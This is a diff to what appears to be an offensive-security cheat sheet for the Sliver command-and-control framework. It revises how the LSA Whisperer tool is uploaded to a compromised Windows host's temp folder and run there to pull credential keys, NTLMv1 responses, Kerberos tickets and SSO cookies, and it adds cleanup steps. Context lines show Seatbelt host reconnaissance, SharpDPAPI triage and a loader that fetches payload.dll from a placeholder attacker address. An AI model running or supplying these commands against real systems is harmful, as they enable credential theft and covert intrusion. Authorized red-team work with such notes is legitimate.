@@ -455,12 +455,19 @@ For tools NOT in the armory, use `execute-assembly` with local .exe files from `
 
 ```
 # LSA Whisperer — works even with Credential Guard enabled
-# Uses LsaCallAuthenticationPackage (never opens LSASS handle)
-execute-assembly --in-process ~/sliver/tools/sharp-tools/lsa-whisperer.exe credkey
-execute-assembly --in-process ~/sliver/tools/sharp-tools/lsa-whisperer.exe ntlmv1
-execute-assembly --in-process ~/sliver/tools/sharp-tools/lsa-whisperer.exe klist
-execute-assembly --in-process ~/sliver/tools/sharp-tools/lsa-whisperer.exe dump
-execute-assembly --in-process ~/sliver/tools/sharp-tools/lsa-whisperer.exe ssocookie
+# NOTE: Native C++ exe, NOT .NET — cannot use execute-assembly (needs CLR)
+# Must upload + execute, or use shell command
+upload ~/sliver/tools/sharp-tools/lsa-whisperer.exe C:\Windows\Temp\lw.exe
+shell
+# Then in the shell:
+C:\Windows\Temp\lw.exe --msv credkey
+C:\Windows\Temp\lw.exe --msv ntlmv1
+C:\Windows\Temp\lw.exe --kerberos klist
+C:\Windows\Temp\lw.exe --kerberos dump
+C:\Windows\Temp\lw.exe --cloudap ssocookie
+# Type 'exit' to return to Sliver
+# Clean up:
+rm C:\Windows\Temp\lw.exe
 
 # Seatbelt — full host recon
 execute-assembly --in-process ~/sliver/tools/sharp-tools/Seatbelt.exe -group=all
@@ -562,11 +569,15 @@ Invoke-Binary /home/kali/tools/Certify.exe find /vulnerable
 Invoke-Binary /home/kali/tools/SharpDPAPI.exe triage
 
 # LSA Whisperer — works even with Credential Guard (talks to LSA directly)
-Invoke-Binary ~/sliver/tools/sharp-tools/lsa-whisperer.exe --msv credkey
-Invoke-Binary ~/sliver/tools/sharp-tools/lsa-whisperer.exe --msv ntlmv1
-Invoke-Binary ~/sliver/tools/sharp-tools/lsa-whisperer.exe --kerberos klist
-Invoke-Binary ~/sliver/tools/sharp-tools/lsa-whisperer.exe --kerberos dump
-Invoke-Binary ~/sliver/tools/sharp-tools/lsa-whisperer.exe --cloudap ssocookie
+# NOTE: Native C++ exe, NOT .NET — Invoke-Binary won't work (needs CLR)
+# Upload first, then execute directly:
+upload ~/sliver/tools/sharp-tools/lsa-whisperer.exe C:\Windows\Temp\lw.exe
+cmd /c C:\Windows\Temp\lw.exe --msv credkey
+cmd /c C:\Windows\Temp\lw.exe --msv ntlmv1
+cmd /c C:\Windows\Temp\lw.exe --kerberos klist
+cmd /c C:\Windows\Temp\lw.exe --kerberos dump
+cmd /c C:\Windows\Temp\lw.exe --cloudap ssocookie
+del C:\Windows\Temp\lw.exe
 
 # Load DLLs in memory
 Dll-Loader -http http://YOUR_IP:8080/payload.dll
